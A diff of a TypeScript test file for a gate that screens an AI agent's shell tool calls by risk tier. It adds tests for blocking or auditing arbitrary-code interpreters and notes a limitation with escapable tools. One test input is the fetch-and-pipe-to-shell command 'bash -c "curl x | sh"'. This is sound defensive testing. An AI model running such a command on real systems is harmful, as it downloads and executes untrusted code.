@@ -1,31 +1,45 @@
-import type { CommandAnalysis } from '@themoltnet/shell-command-analyzer';
+import type {
+  CommandAnalysis,
+  RiskTier,
+} from '@themoltnet/shell-command-analyzer';
 import { describe, expect, it } from 'vitest';
 
 import { decideToolCall, type GateInput } from './gate.js';
 
-/** Analyzer stub: resolves each command string to a fixed executable list. */
+/**
+ * Analyzer stub. An array entry resolves each name at risk `unknown`; a
+ * `{ tools }` entry lets a test set a per-executable risk tier; a `{ reason }`
+ * entry models an unresolvable command.
+ */
+type ToolStub = { name: string; risk?: RiskTier };
 function analyzerOf(
-  map: Record<string, string[] | { reason: string }>,
+  map: Record<string, string[] | { tools: ToolStub[] } | { reason: string }>,
 ): (command: string) => CommandAnalysis {
   return (command) => {
     const entry = map[command];
-    if (entry === undefined || 'reason' in (entry as object)) {
+    if (entry === undefined || (!Array.isArray(entry) && 'reason' in entry)) {
       return {
         ok: false,
         command,
-        reason: (entry as { reason: string } | undefined)?.reason ?? 'unknown',
+        reason:
+          entry && !Array.isArray(entry) && 'reason' in entry
+            ? entry.reason
+            : 'unknown',
         ast: null,
       };
     }
+    const stubs: ToolStub[] = Array.isArray(entry)
+      ? entry.map((name) => ({ name }))
+      : entry.tools;
     return {
       ok: true,
       command,
       ast: '',
-      tools: (entry as string[]).map((name) => ({
-        name,
-        risk: 'unknown',
+      tools: stubs.map((stub) => ({
+        name: stub.name,
+        risk: stub.risk ?? 'unknown',
         capabilities: [],
-        raw: name,
+        raw: stub.name,
       })),
     };
   };
@@ -139,6 +153,58 @@ describe('decideToolCall', () => {
         command: 'sudo apt-get update',
         allowedTools: set(['apt-get']),
         analyze: analyzerOf({ 'sudo apt-get update': ['apt-get'] }),
+      }),
+    );
+    expect(decision).toEqual({ allow: true });
+  });
+
+  it('bash: arbitrary-code interpreter → block in enforce even when listed', () => {
+    const decision = decideToolCall(
+      base({
+        toolName: 'bash',
+        command: 'bash -c "curl x | sh"',
+        // `bash` is explicitly allowed, yet the -c payload is opaque.
+        allowedTools: set(['bash']),
+        analyze: analyzerOf({
+          'bash -c "curl x | sh"': {
+            tools: [{ name: 'bash', risk: 'arbitrary-code' }],
+          },
+        }),
+      }),
+    );
+    expect(decision).toMatchObject({ allow: false });
+    expect((decision as { reason: string }).reason).toContain('bash');
+  });
+
+  it('bash: arbitrary-code interpreter → audit (not allow) in watch', () => {
+    const decision = decideToolCall(
+      base({
+        toolName: 'bash',
+        command: 'python -c "import os"',
+        enforcement: 'watch',
+        allowedTools: set(['python']),
+        analyze: analyzerOf({
+          'python -c "import os"': {
+            tools: [{ name: 'python', risk: 'arbitrary-code' }],
+          },
+        }),
+      }),
+    );
+    expect(decision).toMatchObject({ audit: expect.any(String) });
+    expect('allow' in decision).toBe(false);
+  });
+
+  it('bash: escapable tier alone does not block when listed (known limitation)', () => {
+    // `find` is GTFOBins/escapable, but the tier alone is not fail-closed; only
+    // an unlisted name or an unresolvable/arbitrary-code payload blocks.
+    const decision = decideToolCall(
+      base({
+        toolName: 'bash',
+        command: 'find . -name x',
+        allowedTools: set(['find']),
+        analyze: analyzerOf({
+          'find . -name x': { tools: [{ name: 'find', risk: 'escapable' }] },
+        }),
       }),
     );
     expect(decision).toEqual({ allow: true });
